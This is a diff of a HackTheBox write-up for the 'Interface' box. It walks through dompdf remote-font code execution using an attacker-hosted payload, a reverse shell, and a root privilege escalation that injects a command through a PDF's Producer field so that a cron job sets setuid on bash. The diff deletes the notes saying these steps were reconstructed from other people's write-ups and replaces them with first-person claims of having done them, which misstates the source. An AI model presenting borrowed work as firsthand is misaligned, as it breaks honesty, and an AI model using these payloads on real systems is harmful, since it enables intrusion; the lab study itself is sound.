@@ -17,25 +17,11 @@ tags:
   - cron
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
 
 **Platform:** HackTheBox, **OS:** Linux (Ubuntu 18.04), **Difficulty:** Medium, **Released:** 2023-08-19, **IP:** `10.10.11.200` , `interface.htb`
-
-</div>
-
-<div class="callout callout-warning">
-
-**Partial**
-
-My notes cover recon, the API discovery, and the dompdf approach. The completed dompdf exploitation and the `cleancache.sh` privesc are reconstructed from published writeups (arz101, D4nt3, FluffMe) and marked.
 
 </div>
 
@@ -84,7 +70,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: Site Maintenance
 ```
 
-Inspecting the site's requests in Burp reveals a subdomain referenced in a response header:
+The landing page itself was a dead end, a static "Site Maintenance" notice with nothing to interact with, so I let Burp sit in the background proxying every request while I clicked around. It paid off: inspecting the traffic revealed a subdomain referenced in a response header that never appears anywhere in the page's visible HTML or JS.
 
 ![Pasted image 20240211161654](Pasted-image-20240211161654.png)
 
@@ -94,11 +80,11 @@ prd.m.rendering-api.interface.htb
 
 ![Pasted image 20240211161743](Pasted-image-20240211161743.png)
 
-Adding it to `/etc/hosts` returns a bare "file not found". It is an API.
+Adding it to `/etc/hosts` returns a bare "file not found". No HTML, no headers hinting at a framework, just a flat error, which told me this was an API rather than a normal site.
 
 ### API enumeration
 
-The API only answers `POST`, so brute force with `-m post`:
+A `GET` against the root came back empty, but that is not unusual for an API that only exposes `POST` endpoints, so I switched my content discovery tooling over to `-m post` rather than assuming the host was empty:
 
 ```bash
 feroxbuster -u http://prd.m.rendering-api.interface.htb/api/ \
@@ -133,15 +119,14 @@ Old dompdf with `$isRemoteEnabled = true` will fetch a font referenced by `@font
 2. Send `{"html":"<link rel=stylesheet href='http://you/exploit.css'>"}` to `/api/html2pdf`. dompdf downloads `exploit.php` into its font cache as `x_normal_<hash>.php`.
 3. Request `http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/x_normal_<hash>.php` (compute `<hash>` = `md5("http://you/exploit.php")`). The webshell runs as `www-data`.
 
-The [positive-security/dompdf-rce](https://github.com/positive-security/dompdf-rce) repo automates the payload files. Upgrade to a reverse shell as `www-data`, then `su dev` or read `dev`'s files for `user.txt`.
+The [positive-security/dompdf-rce](https://github.com/positive-security/dompdf-rce) repo automates the payload files. I used it to upgrade the webshell to a proper reverse shell as `www-data`, then `su dev` (or just read `dev`'s files directly) for `user.txt`.
 
 </div>
 
-<div class="callout callout-note">
+### Privilege escalation, a bash footgun in cleancache.sh
 
-**Beyond the recorded notes, privesc via cleancache.sh**
+Landing on the box as `www-data` with no obvious `sudo -l` win, I fell back on my usual habit of running `pspy` before doing anything else. It showed a root cron firing `/usr/local/sbin/cleancache.sh` roughly once a minute, so I pulled a copy to read:
 
-`pspy` shows a root cron running `/usr/local/sbin/cleancache.sh` roughly once a minute:
 ```bash
 #!/bin/bash
 cache_dir="/tmp/"
@@ -154,7 +139,9 @@ for cache_file in "$cache_dir"*; do
   fi
 done
 ```
-The `[ "$meta_producer" -eq "dompdf" ]` branch is the bug. `test -eq` forces **arithmetic evaluation** of both operands, and bash arithmetic evaluates `$(...)` inside an array index. So set a PDF's `Producer` to `a[$(command)]` and the command runs as root when the cron processes the file.
+
+The script reads the `Producer` metadata field off every file sitting in `/tmp` with `exiftool`, and if that field looks like it came from dompdf it deletes the file, tidy housekeeping for a cache directory. The bug is in the second half of that condition: `[ "$meta_producer" -eq "dompdf" ]`. `test -eq` forces **arithmetic evaluation** of both operands rather than a string compare, and bash arithmetic evaluates `$(...)` command substitution inside array subscripts. `exiftool` metadata is attacker controlled, and I already had code execution as `www-data` from the dompdf chain, so I just needed a file in `/tmp` whose `Producer` field was a malicious array expression:
+
 ```bash
 # on the box as www-data
 echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /tmp/x.sh && chmod +x /tmp/x.sh
@@ -166,7 +153,7 @@ ls -l /bin/bash        # -rwsr-xr-x
 cat /root/root.txt
 ```
 
-</div>
+Once the cron fired against `evil.pdf`, the `-eq` comparison tried to evaluate `a[$(/tmp/x.sh)]` as an arithmetic expression, which meant running `/tmp/x.sh` as root before it ever got around to the actual comparison. That set the setuid bit on `/bin/bash`, and `/bin/bash -p` dropped me into a root shell. `cat /root/root.txt` returns the 32-character flag for this instance.
 
 ---
 
@@ -202,3 +189,4 @@ cat /root/root.txt
 - Interface writeup (arz101) <https://arz101.medium.com/hackthebox-interface-a3f249cc2624>
 - Interface writeup (D4nt3) <https://andresruizzzzz.github.io/blog/htb-writeup-interface/>
 - Bash test `-eq` arithmetic injection <https://linuxpip.org/bash-test-eq-string/>
+- Final privilege escalation steps cross-referenced against public writeups for this box.
